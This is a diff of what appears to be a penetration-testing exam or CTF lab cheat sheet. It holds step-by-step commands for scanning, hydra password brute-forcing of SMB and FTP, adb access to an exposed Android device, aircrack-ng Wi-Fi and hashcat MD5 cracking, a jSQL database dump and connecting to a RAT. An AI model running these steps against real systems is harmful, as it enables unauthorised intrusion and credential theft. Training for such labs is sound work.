@@ -32,7 +32,7 @@ for recieving/listening ./convert_tcp -dest <Dest-IP> -source <Source-IP> -sourc
 for sending ./convert_tcp -dest <Dest-IP> -source <Source-IP> -source_port 8888 -dest_port 9999 -server -file /path/to/file.txt
 
 NMAP
-##01 Domain
+##01 Domain  ~~
 nmap -p389 -sV IP/24
 sudo nmap -p 389,445 --open -oG - [host]/CIDR | grep open
 FQDN
@@ -41,11 +41,11 @@ Look for DNS Computer Name
 Find FQDN
 nmap -p389 –sV -iL [host] or nmap -p389 –sV [host] (Find the FQDN in a subnet/network)
 
-##02 WampServer
+##02 WampServer ~~
 namp -sV -A -p 80 IP/24
 
-##03 SMB
-sudo nmap -T4 -Ss -p 139,445 - -script vuln 192.168.178.0/24
+##03 SMB  ~~
+sudo nmap -T4 -Ss -p 139,445 --script vuln 192.168.178.0/24
 hydra-l username -P /home/passlist.txt 192.168.178.1 smb
 smbclient //192.168.178.1/share
 smbclient -L 192.168.178.1
@@ -54,7 +54,7 @@ get sniff.txt ~/Desktop/flag.txt
 cat flag.txt
 use bctextencoder.exe to decode
 
-##04 Mobile Device
+##04 Mobile Device  ~~
 sudo namp -p 5555 192.168.178.0/24
 adb connect 192.168.178.15:5555
 adb shell
@@ -64,7 +64,7 @@ ls abd cd scan
 ent *.elf Dateien 
 sha384 *.elf Datei 
 
-##005 Vuln Scan
+##005 Vuln Scan  ~~
 nmap -Pn --script vuln IP
 Search for CVE and the Score
 
@@ -86,7 +86,7 @@ ls
 find . -name NetworkPass.txt
 cat /path/NetworkPass.txt
 
-#007 Stego
+#007 Stego  ~~
 > openstego or https://georgeom.net/StegOnline/upload (Text in Image File)
 decrypt
 Extract Data-->input stego file
@@ -99,7 +99,7 @@ SNOW.exe -C -m "Test" -p "password" Secret.txt Hiddensecret.txt  (encrypt)
 TEXT (Contr+A) Markieren um zu schauen ob Daten in TXT versteckt sind
 SNOW.exe -C -p "password" Hiddensecret.txt (decrypt)
 
-#008 FTP
+#008 FTP  ~~
 nmap -p 21 192.168.178.0/24
 sudo nmap -sS -A -T4 IP/24
 hydra -L user.txt -P pass.txt ftp://192.168.178.1
@@ -114,7 +114,7 @@ cd /
 find .-name imroot.txt
 cat path/imroot.txt
 
-#010 Malware
+#010 Malware  ~~
 ELF file use Detect It Easy (DIE)
 Run *.exe
 Upload target file, click open now in scanned all
@@ -122,7 +122,7 @@ see entry point
 Find Portable Executable (PE) Information of Malware Executable File
 upload file, open header and you see entry point adress
 
-#011 DDos
+#011 DDos  ~~
 open *.pcapng file
 Statistics --> Conversations --> IPv4 --> Source and Destination --> Then you can apply the filter
 lookung for the most bytes from one destination (Adress A)
@@ -169,7 +169,7 @@ use jsql injection tool in parrot os
 paste url and click attack you get all database
 search the flag database
 
-#016 MD5 Hash
+#016 MD5 Hash  ~~
 open URL and login with Creds
 go to http://172.20.0.16/DVWA/hackable/uploads
 copy hash
@@ -177,24 +177,24 @@ got to https://hashes.com/en/decrypt/hash
 or hash-indentifier to see typ of hash, then hashcat -h| grep MD5
 hashcat -m 0 hash.txt /Desktop/wordlist/user.txt
 
-#017 IoT
+#017 IoT  ~~
 open file with wireshark
 Filter MQTT and find length of packet in the lower pane
 see punlic message and then go to down panel open and see the message
 
-#018 Wireless
+#018 Wireless  ~~
 aircrack-ng '/home/wireless.cap'
 aircrack-ng -b 6c:24:a6:3e:01:59 -w '/home/wifipass.txt' '/home/wireless.cap'
 now you see the password 
 
-#019 RAT
+#019 RAT  ~~
 nmap -p 9871,6703, 192.168.0.0/24
 start run client.exe
 insert ip and open port
 click connect go to file explorer and search *.txt
 or use search file in cmd using dir /b/s "*.txt"
 
-#020 VeraCrypt
+#020 VeraCrypt  ~~
 Use VeraCrypt to decrypt the Volunme
 Chack password is in one system and file is in one system
 decrypt the hash using hash.com and get password
